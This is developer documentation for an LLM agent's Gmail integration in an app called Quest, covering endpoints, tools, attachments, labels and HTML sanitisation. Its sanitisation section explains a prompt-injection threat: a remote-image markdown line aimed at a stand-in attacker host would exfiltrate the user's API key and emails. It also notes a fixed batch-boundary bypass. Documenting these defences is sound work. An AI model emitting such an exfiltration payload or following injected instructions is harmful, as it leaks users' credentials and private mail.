# Gmail API Documentation

This document describes the Gmail API endpoints provided by Quest for accessing Gmail data.

## Overview

Quest provides two Gmail APIs:
- **Gmail Simple API** - LLM-friendly operations. The LLM calls these through five dedicated dynamic tools dispatched via the `tool_call` meta tool (`get_gmail_messages`, `list_gmail_labels`, `get_gmail_message_urls`, `create_gmail_draft`, `send_gmail_to_self` -- see [Gmail Simple Tools](#gmail-simple-tools)); the HTTP endpoints (`/api/gmail-simple/*`) stay registered so sandboxed scripts (`run_script` / `run_python`) can call the same operations over the local proxy with `QUEST_PORT` / `QUEST_API_KEY`. The message-fetch operations return a plain markdown document; label operations return JSON
- **Gmail Raw API** - Direct access to the Gmail API (`https://gmail.googleapis.com/gmail/v1/...`) via the `authed_get` tool for GET reads, plus a batch POST proxy endpoint at `/api/gmail-raw/v1/batch`

This document covers both the Simple API and the Raw API.

## Key Files

| File | Description |
|------|-------------|
| `api/gmail/` | Gmail package (split from the former monolithic `api/gmail.py`). Re-exports all 16 public symbols from `api/gmail/__init__.py` for backward compatibility (`from api.gmail import X` continues to work) |
| `api/gmail/constants.py` | API URLs, size limits (`_MAX_TOTAL_ATTACHMENT_SIZE`), regexes, unicode sets (`_INVISIBLE_UNICODE_CODEPOINTS`), URL replacement threshold (`_URL_REPLACEMENT_MIN_LENGTH`) |
| `api/gmail/models.py` | Pydantic models: `DraftAttachment`, `CreateDraftRequest`, `SendEmailToSelfRequest` |
| `api/gmail/helpers.py` | Pure helper functions: `clean_email_markdown()`, `replace_urls_with_identifiers()`, `convert_html_to_markdown()`, `convert_markdown_to_html()` + `sanitize_email_html()` (see [Outgoing HTML Sanitization](#outgoing-html-sanitization)), `extract_attachments()`, `render_message_markdown()` / `render_batch_markdown()` (markdown output for the Simple API fetch endpoints), `simplify_message()`, URL cache functions (`_cache_url_mapping()`, `_get_cached_url_mapping()`), and other transformation utilities |
| `api/gmail/raw_endpoints.py` | Batch POST proxy endpoint (`batch_request`). `parse_and_validate_batch()` in `helpers.py` requires `multipart/mixed` with a declared boundary and splits the body on that same caller-declared boundary (the exact Content-Type forwarded to Gmail), so every part Gmail would execute is checked for GET + allow-listed path -- a fixed `--batch_*` split previously let a custom boundary hide a write request (#279215). The 7 former GET proxy endpoints were migrated to the `authed_get` pattern -- the LLM now calls `gmail.googleapis.com` directly via `tool_call(tool_name="authed_get", ...)` |
| `chat/gemini_api/authed_get.py` | `handle_authed_get()` handler with `gmail.googleapis.com` entry in `_SERVICE_REGISTRY` for authenticated Gmail Raw API GET requests, including `allowed_endpoints` regex validation |
| `api/gmail/simple_endpoints.py` | 6 LLM-friendly read endpoints: `get_message_simple`, `get_messages_batch`, `list_labels_simple`, `get_label_simple`, `get_urls_by_identifiers`, `get_urls_for_message`. The message/batch/label fetches are fully async via `make_authenticated_request()` (httpx); see [Async Read Endpoints](#async-read-endpoints). `_classify_status()` maps non-2xx HTTP status to the `(error_code, message)` pair used in batch error sections |
| `api/gmail/draft_endpoints.py` | Draft creation (`create_draft`), send-to-self (`send_email_to_self`), attachment resolvers (`_resolve_drive_attachment`, `_resolve_workspace_attachment`, `_resolve_gmail_attachment`) |
| `api/gmail/instructions.py` | `get_instructions()` for system prompt documentation (draft field docs, attachment schema, forward draft instructions, send-self documentation, URL replacement docs, and examples) |
| `tests/test_email_cleanup.py` | Test suite (30 test cases) for `clean_email_markdown()` covering invisible Unicode stripping, trailing whitespace removal, newline collapsing, empty/whitespace-only inputs, and preservation of visible content |
| `tests/test_email_html_sanitizer.py` | Test suite for `sanitize_email_html()` / `convert_markdown_to_html()`: remote-image removal (markdown and raw `<img>`, `data:`/protocol-relative/`srcset`), `cid:` images kept, `style`/`<style>`/`<script>`/`<iframe>`/`<svg>`/conditional-comment removal, link scheme allow-list, formatting preservation, an end-to-end `/api/gmail-simple/send-self` MIME check, and an end-to-end `/api/gmail-simple/drafts` check that an attached image gets a `Content-ID` + inline disposition and the `cid:` reference survives in the HTML |
| `tests/test_url_replacement.py` | Test suite (22 test cases) for `replace_urls_with_identifiers()` covering simple links, images, linked images, bare URLs, threshold behavior, deduplication, edge cases, realistic newsletter conversion output, and a full-pipeline integration test through `simplify_message()` |
| `tests/test_gmail_draft_workspace_attachment.py` | Test suite for `_resolve_workspace_attachment()` covering the standalone/project workspace matrix, path-traversal and symlink-escape rejection, missing/non-regular files, MIME sniffing, and the `filename` override sanitization + basename fallback |
| `tests/test_syntax.py` | Parametrized syntax validation test that runs as part of the pytest suite |
| `auth/session.py` | `get_current_user` auth dependency (imported by `api/gmail/`) |
| `auth/google_credentials.py` | `get_valid_service_credentials()` (service credential resolution using `google_services_oauth` exclusively), `make_authenticated_request()` |
| `auth/config.py` | `GOOGLE_SERVICE_SCOPES` constant |
| `chat/route_dispatch.py` | `build_handler_kwargs()` auto-injects `conversation_id` into both Pydantic body models and scalar handler parameters named `conversation_id` (used by `CreateDraftRequest` for workspace attachment resolution, and by Gmail Simple API GET handlers for URL replacement caching) |
| `chat/gemini_api/tool_dispatch.py` | Passes `conversation_id` to `execute_tool_call()` so route dispatch can inject it into request bodies |
| `chat/storage.py` | `ChatStorage.get_conversation_workspace_root()` used by `_resolve_workspace_attachment()` to locate workspace files (the conversation workspace, also for project conversations) |
| `chat/gemini_api/tool_handlers/workspace.py` | `_handle_load_gmail_attachment()` -- local model tool that fetches a Gmail attachment and makes it available for in-context analysis (Gemini: File Upload API; Anthropic: base64-encoded inline content for images/PDFs). Also contains `_handle_archive_gmail_message()` -- archives a Gmail message by applying `[Quest]/archived` label and removing INBOX, with `_ensure_quest_archived_label()` and `_find_or_create_label()` helpers and a per-user label ID cache (`_quest_archived_label_cache`) -- plus the Quest-managed label tools `_handle_list_gmail_quest_labels()` and `_handle_modify_gmail_labels()` (see [Quest-Managed Label Tools](#local-model-tools-quest-managed-labels)), and the Gmail Simple tool handlers `_handle_get_gmail_messages()`, `_handle_list_gmail_labels()`, `_handle_get_gmail_message_urls()`, `_handle_create_gmail_draft()`, `_handle_send_gmail_to_self()` wrapping the `api/gmail` endpoint functions via `_run_gmail_simple_endpoint()` (see [Gmail Simple Tools](#gmail-simple-tools)) |
| `api/gmail/quest_labels.py` | Quest-managed label configuration helpers shared by the settings API and tool handlers: `validate_gmail_label_names()` (normalization + validation for the `gmail_labels` user setting), `get_configured_gmail_labels()`, `full_quest_label_name()` (`[Quest]/<name>` mapping), and the `MAX_GMAIL_LABELS` / `MAX_GMAIL_LABEL_NAME_LENGTH` limits |
| `chat/llm/tool_schemas.py` | `load_gmail_attachment` tool definition in `BASE_TOOLS` (with `provider_descriptions` for provider-specific description overrides); `archive_gmail_message`, `list_gmail_quest_labels`, `modify_gmail_labels`, `get_gmail_messages`, `list_gmail_labels`, `get_gmail_message_urls`, `create_gmail_draft`, and `send_gmail_to_self` tool definitions in `TOOL_CALL_REGISTRY` |
| `tests/test_gmail_simple_tools.py` | Test suite for the Gmail Simple tool handlers: result/error conversion in `_run_gmail_simple_endpoint()`, single-vs-batch routing and bool coercion in `get_gmail_messages`, `conversation_id` injection (and model-supplied spoof rejection) in `create_gmail_draft`, and registry wiring |
| `quest.py` | Route registration (including `POST /api/gmail-simple/send-self`, `POST /api/gmail-raw/v1/batch`, `GET /api/gmail-simple/urls/{message_id}/{identifiers}`, and `GET /api/gmail-simple/urls/{message_id}`) |

## Authentication

All Gmail endpoints require Bearer token authentication and Google Services authorization.

**Implementation:** `get_current_user` dependency in `auth/session.py` (imported by `api/gmail/`). Google API credentials are obtained via `get_valid_service_credentials()` in `auth/google_credentials.py`, which uses `google_services_oauth` tokens exclusively. If the user has not connected Google Services, the function returns `None` and the request fails with a `401`.

**OAuth scopes required** (granted via the separate Google Services OAuth flow at `/auth/google-services`):
- `gmail.readonly` - Read access to messages, threads, and labels
- `gmail.compose` - Draft creation and sending emails to self
- `gmail.modify` - Label management and message archiving (used by `archive_gmail_message`)

These scopes are part of `GOOGLE_SERVICE_SCOPES` in `auth/config.py`, authorized separately from the app login flow. Users who connected Google Services before `gmail.modify` was added must reconnect via Settings > Data Connections to grant the updated permissions.

**Error codes:**
- `401` with `google_services_auth_required` - Google Services not connected or token expired. User must connect Google Services via the Data Connections section in the Settings panel (or via `/auth/google-services`).
- `401` - Invalid or missing API key
- `403` - Access restricted (wrong email domain)

## Gmail Simple Tools

The Gmail Simple operations are exposed to the LLM as five dedicated dynamic tools dispatched via the `tool_call` meta tool (definitions in `TOOL_CALL_REGISTRY` in `chat/llm/tool_schemas.py`, dispatch branches in `chat/gemini_api/tool_dispatch.py`). Each handler in `chat/gemini_api/tool_handlers/gmail_simple.py` calls the corresponding endpoint function in `api/gmail/` directly and converts the result via `_run_gmail_simple_endpoint()` -- `PlainTextResponse` bodies become the raw markdown string, dicts become JSON, and `HTTPException` (the endpoints' error channel) becomes the structured `{"error": ...}` JSON the other dynamic tools return.

| Tool | Handler | Wraps |
|------|---------|-------|
| `get_gmail_messages` | `_handle_get_gmail_messages()` | `get_message_simple()` for a single id (no batch chrome), `get_messages_batch()` for several (comma-joined ids, 50-id cap enforced by the endpoint) |
| `list_gmail_labels` | `_handle_list_gmail_labels()` | `list_labels_simple()`, or `get_label_simple()` when `label_id` is passed |
| `get_gmail_message_urls` | `_handle_get_gmail_message_urls()` | `get_urls_by_identifiers()` when `identifiers` is passed, else `get_urls_for_message()` |
| `create_gmail_draft` | `_handle_create_gmail_draft()` | `create_draft()`; builds `CreateDraftRequest` from the tool arguments with `conversation_id` supplied from dispatch context (a model-supplied value is ignored), rejects unknown parameter names |
| `send_gmail_to_self` | `_handle_send_gmail_to_self()` | `send_email_to_self()` via `SendEmailToSelfRequest`; `conversation_id` supplied from dispatch context (a model-supplied value is ignored) so workspace attachments resolve against the right workspace |

The Gmail Simple tools do **not** support search queries (no `q` parameter). Search must go through the Gmail Raw API via `authed_get`, then message IDs can be fetched via `get_gmail_messages`.

## Gmail Simple API Endpoints

The HTTP endpoints backing the tools stay registered in `quest.py` so sandboxed scripts (`run_script` / `run_python`) can call the same operations over the local proxy at `localhost:$QUEST_PORT` with `Authorization: Bearer $QUEST_API_KEY` (see [Script Runner](../architecture/script-runner.md)).

Script calls carry no conversation context: `conversation_id` stays `None`, so URL replacement gracefully degrades to full inline URLs and workspace draft attachments are unavailable (see [conversation_id Auto-Injection](#conversation_id-auto-injection)).

The generic `curl_proxy_get`/`curl_proxy_post` tools can also still reach these routes, but the LLM-facing documentation (`api/gmail/instructions.py`, surfaced as the `system:gmail` skill) steers the model to the dedicated tools.

All Simple API endpoints are defined in `api/gmail/simple_endpoints.py`. See that file for parameters and error codes.

- GET `/api/gmail-simple/messages/{message_id}` -- `get_message_simple()`. Returns a markdown document built by `render_message_markdown()` in `api/gmail/helpers.py`. Registered with `response_class=PlainTextResponse` and served as `Content-Type: text/markdown`. `conversation_id` supplied by the tool handler (or auto-injected by route dispatch on the legacy curl path) for the URL mapping cache. See [Message Fetch Response Format](#message-fetch-response-format) below.
- GET `/api/gmail-simple/messages?ids=ID1,ID2,...` -- `get_messages_batch()`. Hard limit of 50 IDs per request. Returns a markdown document built by `render_batch_markdown()` in `api/gmail/helpers.py` (also `text/markdown`). Supports partial failures, surfaced in a `## Batch errors` section.
- GET `/api/gmail-simple/labels` -- `list_labels_simple()`. Returns JSON.
- GET `/api/gmail-simple/labels/{label_id}` -- `get_label_simple()`. Returns JSON.
- GET `/api/gmail-simple/urls/{message_id}/{identifiers}` -- `get_urls_by_identifiers()`. Looks up full URLs from `(#N#)` identifiers cached during message fetch. Returns JSON.
- GET `/api/gmail-simple/urls/{message_id}` -- `get_urls_for_message()`. Returns all cached URL mappings for a message. Returns JSON.

### Async Read Endpoints

The single-message, batch, and label endpoints call the Gmail API through `make_authenticated_request()` (async `httpx.AsyncClient`) in `auth/google_credentials.py` -- the same path the draft/raw write endpoints use -- rather than the blocking synchronous `googleapiclient` (`.execute()`). This keeps the single uvicorn event loop free during upstream Gmail calls; the previous blocking calls pinned the loop and starved the DB connection pool under concurrent load (see [Database Architecture](../architecture/database.md), Connection PRAGMAs).

Behavioral notes:

- **Concurrent batch fetch:** `get_messages_batch()` issues per-message fetches concurrently with `asyncio.gather`, bounded by an `asyncio.Semaphore(_BATCH_CONCURRENCY)` (10) so a full 50-id batch makes at most 10 in-flight calls. Result ordering matches the requested ID order, the 50-id hard cap is unchanged, and partial failures still surface in the `## Batch errors` section.
- **Error classification by HTTP status:** errors are classified from the upstream HTTP status code via `_classify_status()` (404 -> `not_found`, 403 -> `access_denied`, 400 -> `invalid_id`, else `fetch_error`) instead of from a stringified `googleapiclient` exception.
- **Real upstream status propagation:** `get_message_simple()`, `list_labels_simple()`, and `get_label_simple()` now raise the real upstream Gmail status (e.g. 404 for a missing message/label) instead of a blanket 500.
- **Per-call timeout:** each Gmail HTTP call uses `_GMAIL_HTTP_TIMEOUT` (30s) so a hung upstream call cannot pin a connection.

### Message Fetch Response Format

The single-message and batch operations return markdown, not JSON. The tool handlers decode the `PlainTextResponse.body` bytes to a string in `_run_gmail_simple_endpoint()` (`chat/gemini_api/tool_handlers/gmail_simple.py`) -- and route dispatch does the same in `_serialize_result()` (`chat/route_dispatch.py`) for the legacy curl path -- so the LLM receives the same raw markdown that a direct HTTP client receives over the wire.

**Single message** -- produced by `render_message_markdown()`:

```
Subject: Hello
From: Ada <ada@example.com>
To: grace@example.com
Date: Mon, 27 Jan 2025 10:00:00 -0800
Message-ID: <CAA123@mail.gmail.com>
Gmail Message ID: msg-123
Thread ID: thread-123
Labels: INBOX, UNREAD

---

## Body

Hi there.

---

## Attachments

- **resume.pdf** -- `application/pdf`, 12,345 bytes, attachmentId: `abc`
```

Headers (From/To/Cc/Bcc/Date/Message-ID/Gmail Message ID/Thread ID/Labels) are plain `Label: value` lines -- no markdown heading for the subject and no `Snippet:` line. An optional `Replaced URL count: N` line follows `Labels:` when long URLs were substituted with `(#N#)` identifiers (see [URL Replacement](#why-replace-long-urls-with-numeric-identifiers)). Cc/Bcc lines are omitted when empty. The `## Attachments` section is emitted even when there are no attachments (with the placeholder `_No attachments._`). When `include_html=true`, the body section is `## Body (HTML)` containing a fenced block (`html` language, fence widened to outlast any backtick run inside the HTML).

**Batch response** -- produced by `render_batch_markdown()`:

```
# Gmail messages batch

Fetched 2 message(s). 1 error(s).

## Batch errors

- **msg-missing** -- `fetch_error`: Message not found

===

Subject: Hello
...

===

Subject: Second message
...
```

The `## Batch errors` section is omitted entirely when there are no errors. Successful per-message sections use the same format as the single-message output and are joined by `===` dividers (distinct from the `---` dividers used within a single message). Entries appear in the order the IDs were requested.

### Create Draft

**Tool:** `create_gmail_draft` / **Endpoint:** POST `/api/gmail-simple/drafts`

**Implementation:** `create_draft()` in `api/gmail/draft_endpoints.py`

Creates a draft email in the user's Gmail account. Does **not** send the email. Supports plain text (`body`) or markdown (`body_md`) email bodies, and optional file attachments from Google Drive, the conversation workspace, or existing Gmail messages (for forwarding).

**Request body model:** `CreateDraftRequest` (Pydantic) in `api/gmail/models.py`. See that model for field definitions. `conversation_id` is supplied by the tool handler from dispatch context (or auto-injected by route dispatch on the legacy curl path).

#### Attachments

Attachments use the `DraftAttachment` Pydantic model in `api/gmail/models.py` on both `CreateDraftRequest` and `SendEmailToSelfRequest`. Three source types are supported via the `type` discriminator, each resolved by a dedicated helper in `api/gmail/draft_endpoints.py`; the shared `_resolve_request_attachments()` (validation, ownership check, size cap) and `_add_attachments_to_message()` (MIME parts + `Content-ID`) helpers are called by both `create_draft()` and `send_email_to_self()`. Attachment uploads do **not** go through the action-request approval flow.

- **Google Drive files** (`type="drive"`, `drive_file_id` required): `_resolve_drive_attachment()`. Native Google Workspace MIME types (`application/vnd.google-apps.*`) are rejected -- include a link in the body instead.
- **Workspace files** (`type="workspace"`, `workspace_path` required): `_resolve_workspace_attachment()`. Path is resolved against the conversation workspace directory returned by `_get_workspace_dir()` in `chat/gemini_api/tool_handlers/_common.py`, so both standalone-conversation workspaces (`data/chats/{conv}/workspace`) and project-shared workspaces (`data/projects/{project}/workspace`) are handled. Requires `conversation_id` (supplied by the tool handler / route dispatch). Absolute paths, `..` traversal, and resolved paths that escape the workspace root are all rejected with HTTP 400; missing files return 404.
- **Gmail message attachments** (`type="gmail"`, `message_id` + `attachment_id` required): `_resolve_gmail_attachment()`. Used for forwarding -- re-attaches binary content from an existing Gmail message without round-tripping through the workspace.

Optional `filename` overrides the display name on every type. For workspace attachments it is sanitized via `_sanitize_workspace_filename()` (in `chat/gemini_api/tool_handlers/_common.py`) and falls back to the resolved file's basename if sanitization empties it. `mime_type` is optional on workspace attachments (sniffed via `mimetypes.guess_type`, defaulting to `application/octet-stream`).

Every attachment carries a `Content-ID` derived from its filename by `attachment_content_id()` in `api/gmail/helpers.py` (runs of characters outside `[A-Za-z0-9._-]` become `_`), image attachments (`is_inline_image_mime()`) are sent with `Content-Disposition: inline`, and both the draft and the send-to-self response list `attachments: [{filename, content_id, inline_image}]`. This is what lets a markdown body embed an attached image as `![caption](cid:<token>)` -- the one image source [Outgoing HTML Sanitization](#outgoing-html-sanitization) allows. The M365 draft tool mirrors this with Graph `contentId` / `isInline` on both the simple-POST and upload-session attachment shapes.

Total attachment size limit: 25 MB across all attachments on a single email (`_MAX_TOTAL_ATTACHMENT_SIZE` in `api/gmail/constants.py` -- Gmail's hard cap). Attachment-shape examples for the LLM are in `get_instructions()` (`api/gmail/instructions.py`). Workspace attachment behaviour is exercised by `tests/test_gmail_draft_workspace_attachment.py` (standalone vs project workspaces, traversal/symlink rejection, filename override fallback).

#### conversation_id Auto-Injection

On the tool path, the Gmail Simple tool handlers pass `conversation_id` straight from the dispatch context (`_dispatch_tool_call()` in `chat/gemini_api/tool_dispatch.py`); `_handle_create_gmail_draft()` and `_handle_send_gmail_to_self()` ignore any model-supplied value. On the legacy curl path, `conversation_id` is auto-injected into both Pydantic body models and scalar handler parameters by `build_handler_kwargs()` in `chat/route_dispatch.py` -- see [Route Dispatch Architecture](../architecture/route-dispatch.md). Over direct HTTP (sandboxed scripts), it stays `None` and the handlers gracefully degrade.

### Send Email to Self

**Tool:** `send_gmail_to_self` / **Endpoint:** POST `/api/gmail-simple/send-self`

**Implementation:** `send_email_to_self()` in `api/gmail/draft_endpoints.py`

Sends an email from the user to themselves via the Gmail API. The subject is automatically prefixed with `[Quest]` (enforced server-side via `_QUEST_SUBJECT_PREFIX` in `api/gmail/constants.py`). The body is provided as markdown and rendered to HTML using `convert_markdown_to_html()` in `api/gmail/helpers.py` (sanitized, see below).

Optional `attachments` take the same `DraftAttachment` list as drafts and go through the same shared resolvers (see [Attachments](#attachments)), so an attached image can be shown inline with `![caption](cid:<filename>)` while remote images stay stripped; the response echoes `attachments: [{filename, content_id, inline_image}]`.

Workspace attachments need the dispatch-injected `conversation_id` (ownership-checked via `require_owned_conversation()`), so they are tool-only -- a sandbox-script call to the HTTP route without one gets a 400 before anything is sent.

See `SendEmailToSelfRequest` in `api/gmail/models.py` for request fields. Exercised by `test_send_self_attached_image_renders_inline_via_cid` / `test_send_self_workspace_attachment_requires_conversation_id` in `tests/test_email_html_sanitizer.py`.

### Outgoing HTML Sanitization

Every email body Quest renders from markdown -- Gmail drafts and self-sends here, and the Outlook draft / self-send tools in `plugins/m365` which reuse the same helper -- goes through `sanitize_email_html()` in `api/gmail/helpers.py`, called unconditionally by `convert_markdown_to_html()`.

The policy is **no remote references**: an `<img>` survives only when its `src` is a `cid:` content-id (an attachment of the message itself); a remote image is replaced by its alt text (or dropped when it has none).

Raw HTML written into the markdown is reduced to the same allow-list of formatting tags markdown produces (`_EMAIL_HTML_ALLOWED_TAGS`), `style` attributes / `<style>` / `<link>` / `<script>` / `<iframe>` / `<object>` / `<embed>` / `<svg>` / comments are removed, and `<a href>` keeps only `http:`/`https:`/`mailto:` (and relative) targets. Text is re-escaped on output.

**Why:** `send_gmail_to_self` and `m365_send_mail_to_self` deliver model-generated content to the user's inbox without an approval card, and drafts are opened in a mail client before the user reviews them. Mail clients fetch remote images when a message is displayed (Gmail proxies them automatically), so a prompt-injected `![](https://attacker/?k=...)` carrying anything the model can see -- the user's Quest API key from the proxy preamble, email contents, memories -- would be exfiltrated the moment the user opened the email.

Sanitizing at the shared renderer makes the guarantee hold for every caller instead of relying on each tool to remember.

Inline images referenced by `cid:` are allowed because the draft tools and `send_gmail_to_self` give every attachment a `Content-ID` (see [Attachments](#attachments)), so the agent embeds an image by attaching it and writing `![caption](cid:<filename>)`.

A `cid:` image is safe on the no-approval self-send path because the bytes come from the message itself (workspace / Drive / Gmail attachments the user already owns) and the fixed recipient is the user -- no fetch leaves the mailbox when the email is opened. `m365_send_mail_to_self` still takes no attachments, so its body never renders an image.

## Gmail Raw API

The Gmail Raw API provides direct access to the Gmail API at `gmail.googleapis.com` and returns unmodified responses (base64-encoded content, full message structures). Use the Raw API for search queries (`q` parameter), attachment fetching, and advanced use cases where the simplified format is insufficient.

**Access pattern:** The LLM calls Gmail Raw API GET endpoints directly via `tool_call(tool_name="authed_get", arguments={"url": "https://gmail.googleapis.com/gmail/v1/..."})`. The `authed_get` handler in `chat/gemini_api/authed_get.py` matches `gmail.googleapis.com` in `_SERVICE_REGISTRY`, injects per-user Google Services OAuth credentials, and proxies the request. An `allowed_endpoints` validation mechanism restricts which API paths can be called, preventing access to arbitrary Gmail API endpoints. The batch POST endpoint remains as a local proxy route at `/api/gmail-raw/v1/batch`.

Gmail Raw API responses (search results, label-scoped message lists, full thread dumps) routinely exceed the 3 KB `authed_get` size gate.

When the model intends to post-process the body with `run_python` / `run_script` rather than read it inline, passing `output_file` on the `authed_get` call writes the JSON under the hidden `.responses/` subdirectory of the conversation/project workspace (non-destructively -- a name collision errors) and returns a small receipt whose `path` is the `.responses/...` location instead of the body.

See [Large Response Protection](../architecture/gemini-api.md#large-response-protection) for the size gate, the `force_large_response` blob path, and the `output_file` `.responses/` branch.

### Allowed Endpoints Validation

The Gmail `_SERVICE_REGISTRY` entry includes an `allowed_endpoints` field: a list of regex patterns defining which URL paths are permitted. Before making the HTTP request, `_make_authed_request()` checks the request path against these compiled regexes. If no pattern matches, the request is rejected with an error listing the allowed patterns. See `chat/gemini_api/authed_get.py` for the allowed endpoint patterns and `api/gmail/instructions.py` (`get_instructions()`) for usage documentation provided to the LLM.

### Batch Request

**Endpoint:** POST `/api/gmail-raw/v1/batch` (local proxy route, registered in `quest.py`)

**Implementation:** `batch_request()` in `api/gmail/raw_endpoints.py`

Accepts a `multipart/mixed` batch request containing multiple Gmail API GET requests, validates them, and proxies the batch to `https://gmail.googleapis.com/batch/gmail/v1`. This remains as a proxy endpoint because batch requests use POST with multipart bodies, which the `authed_get` tool (GET-only) cannot handle.

## Local Model Tool: load_gmail_attachment

`load_gmail_attachment` is a local tool available to all LLM models. It is not an HTTP endpoint -- it executes inline in the conversation loop.

**Purpose:** Fetch a Gmail message attachment and make it available for the model to analyze directly in context (e.g., read a PDF, inspect an image).

**Implementation:** `_handle_load_gmail_attachment()` in `chat/gemini_api/tool_handlers/workspace.py`. The handler calls `_resolve_gmail_attachment()` in `api/gmail/draft_endpoints.py` to fetch the attachment bytes, writes to a temporary file, and uploads via the provider's `upload_file()` method. For Gemini, this uses the File Upload API; for Anthropic, this base64-encodes supported images and PDFs as inline content blocks.

**Tool definition:** `chat/llm/tool_schemas.py` (in `BASE_TOOLS`). See that file for parameter definitions.

**Constraints:**
- Requires Google Services to be connected (`google_services_oauth` on the user record)
- Follows the same provider-agnostic upload pattern as `get_workspace_file`, including the pre-flight size check against the per-model attachment cap from `chat/llm/file_limits.py` -- Gmail attachments can reach ~25MB raw, above some backend caps -- which returns a structured tool error with a `suggestion` instead of failing the provider request (see [Gemini API Integration](../architecture/gemini-api.md))

## Local Model Tool: archive_gmail_message

`archive_gmail_message` is a dynamic tool dispatched via the `tool_call` meta tool. It executes inline in the conversation loop via `_handle_archive_gmail_message()` in `chat/gemini_api/tool_handlers/gmail_labels.py`.

**Purpose:** Archive a Gmail message by removing it from the inbox and applying a `[Quest]/archived` label. The message remains accessible in Gmail under All Mail and the `[Quest]/archived` label.

**Tool definition:** `chat/llm/tool_schemas.py` (in `TOOL_CALL_REGISTRY`). See that file for parameter definitions.

**Labeling behavior:** The handler ensures `[Quest]` and `[Quest]/archived` labels exist (creating them if needed via `_ensure_quest_archived_label()` and `_find_or_create_label()`), then modifies the message to add `[Quest]/archived` and remove `INBOX`. Label IDs are cached per-user in `_quest_archived_label_cache`. Stale cache entries (label deleted externally) trigger eviction and one retry.

**Optional `add_labels`:** the tool accepts an optional `add_labels` list of short configured names from the user's `gmail_labels` setting (see [Quest-Managed Label Tools](#local-model-tools-quest-managed-labels)), applied in the same `messages.modify` call as the archive -- so archive-and-label needs no separate `modify_gmail_labels` round trip. Validation is all-or-nothing: an unknown name rejects the call without archiving. Extra labels are resolved fresh (created on demand, no cache) inside the retry loop.

**Constraints:**
- Requires the `gmail.modify` scope (`GOOGLE_SERVICE_SCOPES` in `auth/config.py`). Users who connected Google Services before this scope was added must reconnect.
- Race condition on label creation is handled (409/already-exists caught and re-fetched).

## Local Model Tools: Quest-Managed Labels

Beyond archiving, Quest can add/remove a **user-configured** set of labels on Gmail messages. The user maintains a list of label names in Settings > Gmail (a section listed only while the user's Google Services connection is connected), stored in the `users.settings` JSON blob under `gmail_labels` (validated on write by `validate_gmail_label_names()` in `api/gmail/quest_labels.py`: max 50 names, 80 chars each, no `/`, case-insensitive dedupe; `PUT /settings` rejects invalid lists with 400 `invalid_gmail_labels`). Each configured name maps to the nested Gmail label `[Quest]/<name>` -- the same `[Quest]` parent group used by `[Quest]/archived`.

Both tools are dynamic tools dispatched via the `tool_call` meta tool, implemented in `chat/gemini_api/tool_handlers/gmail_labels.py`. Both re-read the user's settings fresh from the DB on every call so mid-conversation Settings edits take effect immediately.

### list_gmail_quest_labels

Returns the configured label names, each with its full `[Quest]/<name>` Gmail label name, plus the always-available `archive_label`. Reads configuration only -- no Gmail API call is made (labels that don't exist in Gmail yet are created on first use by `modify_gmail_labels`).

### modify_gmail_labels

Adds and/or removes configured labels on **1-100 message IDs in a single call** (`_MAX_LABEL_MODIFY_MESSAGE_IDS`). Parameters: `message_ids` (required), `add_labels`, `remove_labels` (short configured names, at least one across the two lists; case-insensitive match against the configured list, unknown names are rejected with the allowed list in the error).

**Labeling behavior:**
- Label names are resolved to Gmail label IDs via a fresh `labels().list()` on every call (no per-user cache, unlike `archive_gmail_message` -- one extra round trip buys immunity to stale IDs across an arbitrary label set).
- Add-labels are created on demand under the `[Quest]` parent (reusing `_find_or_create_label()`); remove-labels that don't exist in Gmail are skipped as no-ops and reported in `skipped_remove_labels`.
- All message IDs are modified in a single Gmail `messages.batchModify` call.
- Does **not** touch the INBOX label -- archiving remains exclusive to `archive_gmail_message`.

**Constraints:**
- Same `gmail.modify` scope requirement as `archive_gmail_message`.
- Only labels from the user's configured list can be used; an empty configuration makes `modify_gmail_labels` unusable until the user adds names in Settings > Gmail.

## Message Processing Pipeline

The `simplify_message()` pipeline in `api/gmail/helpers.py` processes HTML email bodies through three sequential steps: HTML-to-markdown conversion (`convert_html_to_markdown()`), invisible Unicode stripping and newline collapsing (`clean_email_markdown()`), and URL replacement (`replace_urls_with_identifiers()`). Stripped characters are defined in `_INVISIBLE_UNICODE_CODEPOINTS` in `api/gmail/constants.py`. URL mappings are cached per-conversation via `sqlitedict` at `data/chats/{conversation_id}/url_mappings.sqlite`.

The URL replacement uses a three-pass approach (linked images, inline links, bare URLs) to handle nested markdown structures correctly. See `replace_urls_with_identifiers()` in `api/gmail/helpers.py` for implementation details.

## Design Decisions

**Why two APIs (Simple vs Raw)?**
The Simple API exists for LLM consumption -- it decodes base64 content, converts HTML to markdown, extracts key headers, and renders the whole message as a single markdown document. The Raw API provides direct access to Gmail API responses (via `authed_get`) for search queries, attachment fetching, and advanced use cases.

**Why dedicated tools instead of `curl_proxy_get` URLs?**
The Simple API was originally reached by having the model construct `http://localhost:8000/api/gmail-simple/...` URLs for the generic `curl_proxy_get`/`curl_proxy_post` tools. Dedicated tools give each operation a typed schema (the model can't mistype a query parameter or URL path), let dispatch supply `conversation_id` without route-dispatch signature introspection, and make intent visible in the UI as a named tool call. The HTTP endpoints are deliberately kept registered: sandboxed scripts reach them over real HTTP through the local proxy (`QUEST_PORT`/`QUEST_API_KEY`), a path that never touched `curl_proxy_get`'s in-process dispatch.

**Why return markdown from the message-fetch endpoints instead of JSON?**
The LLM consumes these responses directly as tool-call output. A JSON envelope wrapping a markdown body (the previous shape) forced the model to read past quoted JSON punctuation and escape sequences to reach the email content, while the structured metadata next to it (headers, labels, attachment IDs) could just as easily be surfaced as labelled lines.

Emitting a single markdown document (`render_message_markdown()` / `render_batch_markdown()` in `api/gmail/helpers.py`) gives the model a readable subject/headers/body/attachments layout, keeps every metadata field recoverable (including the `Message-ID` header used for reply threading and each attachment's `attachmentId`), and lets direct HTTP clients serve the same bytes with `Content-Type: text/markdown`.

**Why use `authed_get` for Gmail Raw API reads instead of proxy endpoints?**
The `authed_get` pattern (used by Google Calendar, Google Drive, and Google Docs) is simpler than maintaining dedicated proxy endpoints for each GET operation. The LLM calls `gmail.googleapis.com` directly, and `authed_get` handles credential injection, 401 retry, and per-user OAuth transparently. The batch POST endpoint remains as a proxy route because `authed_get` only supports GET requests.

**Why batch endpoint with a hard limit of 50 messages?**
Reduces API round trips when fetching multiple messages. The 50-message hard limit (enforced server-side -- requests with more than 50 IDs fail) prevents timeout issues and excessive memory usage. Callers must split larger ID sets into multiple requests.

**Why partial failure support?**
When fetching multiple messages, some may be deleted or inaccessible. Returning partial results with per-message errors allows the client to handle each case appropriately.

**Why markdown conversion for HTML emails?**
